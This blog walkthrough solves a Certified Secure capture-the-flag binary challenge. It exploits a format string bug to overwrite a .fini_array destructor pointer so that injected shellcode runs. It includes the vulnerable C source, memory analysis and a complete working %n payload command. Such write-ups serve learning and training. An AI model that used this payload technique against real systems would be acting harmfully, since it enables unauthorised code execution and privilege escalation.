![Logo](/assets/images/belts-yellow.png)

We'll continue with level2 of the **Certified Secure Binary Mastery**, [Ensign](https://www.certifiedsecure.com/certification/view/37). This time it will be another classic issues that needs no introduction - _uncontrolled format strings attacks_. To review the previous level, check the link below:
* [Binary Master: Ensign - Level 1](https://livz.github.io/2016/01/07/binary-master-ensign-1.html)

## 0 - Discovery

Let's connect to the server and check the binary we're dealing with:
```
$ ssh level2@hacking.certifiedsecure.com -p 8266
0 packages can be updated.
0 updates are security updates.

   ___  _                      __  ___         __              
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \
                            \__/_//_/___/_/\_, /_//_/
                                          /___/      

```

Let's see if we have any mitigation techniques using [checksec.sh](http://www.trapkit.de/tools/checksec.html), downloaded and run locally :
```bash
$ checksec.sh --file level2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   level2
```

NX is disabled and now there *is* a stack canary. But let's not worry about this yet, because we might not even be bothered by the presence of the canary. Let's verify that the stack is executable:
```
$ readelf -lW level2 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

The R**W**E flag suggests Read-**Write**-Execute flags are all enabled. Also remember from the previous level that ASLR is disabled on the system and all the addresses are static.

## 1 - Vulnerability

What we have here is a classic uncontrolled format string vulnerability. The value of _buf_ comes from the user and is passed directly as a format string to the _printf_ call. There are so many excellent resources on this type of issues, there is no need for further details. If you're not familiar with it, for a better understanding, please check at least the following two papers. For brevity I will skip most of the details regarding the methodlogy which can be found in those papers.
* team teso - [Exploiting Format String Vulnerabilities](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)
* Saif El-Sherei - [Format String Exploitation-Tutorial](https://www.exploit-db.com/docs/28476.pdf)

```c
#include <stdio.h>
#include <string.h>

__attribute__((destructor)) void end(void) {
        printf("Bye!\n");
}

void helloworld(char* name) {
        char buf[128];

        strncpy(buf, name, 127);
        buf[127] = '\0';

        printf("Hello ");
        printf(buf);
        printf("!\n");
}

int main(int argc, char** argv) {
        if (argc != 2) {
                printf("Usage: %s <name>\n", argv[0]);

                return -1;
        }

        helloworld(argv[1]);

        return 0;
}
```

While we're here looking at the code, see if you notice anything unusual. What about the presence of the destructor function that just prints **"Bye!"**? Couldn't that be done just as a normal _printf_ call at the end of the _main_ function? Maybe it is a hint of some sort. Keep that in mind for later!

## 2 - Exploitation

Using the techniques from the second paper mentioned above, we can read and also overwrite any memory location. Exploitation steps:
* Place a shellcode in an environment variable.
* Find the address of the environment variable on the stack.
* Use the format string vulnerability to overwrite the address of the destructor **end** with the address of our environment variable.

To generate an appropriate shellcode and place it in an environment variable, check the previous post. To find out the address of our environment variable on the stack, again check the previous level.

First thing is to find out the address of the _end_ destructor. IDA Pro shows this really quickly if we check the **_.fini_array_** section. Notice also the permissions of this section. This is important because we want to overwrite the location of _end_ function with an address we control.

![ida destructor](/assets/images/bm2-1.png)

We can also use Linux tools to get the same information:

```bash
$ readelf -S  level2    
There are 30 section headers, starting at offset 0x9b8:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048168 000168 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        0804818c 00018c 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481ac 0001ac 000080 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804822c 00022c 000074 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080482a0 0002a0 000010 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080482b0 0002b0 000030 00   A  6   1  4
  [ 9] .rel.dyn          REL             080482e0 0002e0 000008 08   A  5   0  4
  [10] .rel.plt          REL             080482e8 0002e8 000030 08   A  5  12  4
  [11] .init             PROGBITS        08048318 000318 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048340 000340 000070 04  AX  0   0 16
  [13] .text             PROGBITS        080483b0 0003b0 000242 00  AX  0   0 16
  [14] .fini             PROGBITS        080485f4 0005f4 000014 00  AX  0   0  4
  [15] .rodata           PROGBITS        08048608 000608 000028 00   A  0   0  4
  [16] .eh_frame_hdr     PROGBITS        08048630 000630 00003c 00   A  0   0  4
  [17] .eh_frame         PROGBITS        0804866c 00066c 0000f0 00   A  0   0  4
  [18] .init_array       INIT_ARRAY      0804975c 00075c 000004 00  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      08049760 000760 000008 00  WA  0   0  4
  [20] .jcr              PROGBITS        08049768 000768 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         0804976c 00076c 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049854 000854 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049858 000858 000024 04  WA  0   0  4
  [24] .data             PROGBITS        0804987c 00087c 000008 00  WA  0   0  4
  [25] .bss              NOBITS          08049884 000884 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 000884 00002b 01  MS  0   0  1
  [27] .shstrtab         STRTAB          00000000 0008af 000106 00      0   0  1
  [28] .symtab           SYMTAB          00000000 000e68 000480 10     29  45  4
  [29] .strtab           STRTAB          00000000 0012e8 0002a1 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
```

Notice that section 19 - _.fini\_array_ is writable. Exactly what we need. And to dump the section in hex:

```bash
$ readelf --hex-dump=.fini_array level2

Hex dump of section '.fini_array':
  0x08049760 60840408 ad840408                   `.......
```
Second element at 0x08049764 is ad840408, or 0x080484ad - exactly the address of function **end**:
```bash
gdb-peda$ x/wx 0x08049764
0x8049764:      0x080484ad
gdb-peda$ p end
$4 = {<text variable, no debug info>} 0x80484ad <end>
```

Next we need to play a bit with the format string in order to discover how to correctly overwrite the value at address 0x08049764. Again, more explicit details on how to do this can be found in the second referenced paper.  So let's place our shellcode in the EGG environment variable, as we did before and get its address:

```bash
$  /tmp/level2-mod aaa
Hello aaa!
EGG address: 0xffffd8d3
```

**Warning!** If you're testing your exploit in GDB first (and you should), the address of the environment variables on the stack will be slightly different than outside GDB. While in GDB, you can print these addresses  by iterating through the _environ_ array. In my testcase the EGG variable was the 5th element:

```
(gdb) x/s *((char **)environ+4)
0xffffd903:     "EGG=", 'A' <repeats 19 times>
```

This means that in GDB the shellcode begins at **0xffffd903+4** (we add the length of the string _EGG=_ ).

Finding the correct format string involved a bit of trial and error, but in the end I managed to overwrite the address of _end_ destructor with my address.

## 3 - Profit

```
$ /levels/level2 $(printf "\x64\x97\x04\x08JUNK\x65\x97\x04\x08JUNK\x66\x97\x04\x08JUNK\x67\x97\x04\x08")%x%x%x%x%x%149x%n%261x%n%39x%n%256x%n
$ /home/level3/victory
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \   
                            \__/_//_/___/_/\_, /_//_/   
                                          /___/         
                            
Subject: Victory!                         
                                          
Congrats, you have solved level2. To update your score,
send an e-mail to unlock@certifiedsecure.com and include:
   * your CS-ID
   * which level you solved (level2 @ binary mastery ensign)
   * the exploit
   
You can now start with level3. If you want, you can log in
as level3 with password  [REDACTED]
```
